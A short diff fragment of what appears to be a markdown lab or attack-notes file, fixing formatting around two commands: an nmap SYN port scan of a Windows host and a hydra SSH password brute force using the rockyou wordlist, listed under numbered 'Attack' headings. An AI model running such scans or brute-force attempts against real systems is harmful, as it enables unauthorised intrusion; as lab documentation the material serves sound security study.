@@ -131,13 +131,13 @@ Bash
 
 **Port scan:**
 
-`nmap -sS <Windows_IP>
+`nmap -sS <Windows_IP>`
 
 # Attack 2:
 
 **Brute force:**
 Bash
-`hydra -l admin -P rockyou.txt <IP> ssh
+`hydra -l admin -P rockyou.txt <IP> ssh`
 
 # Attack 3:
 
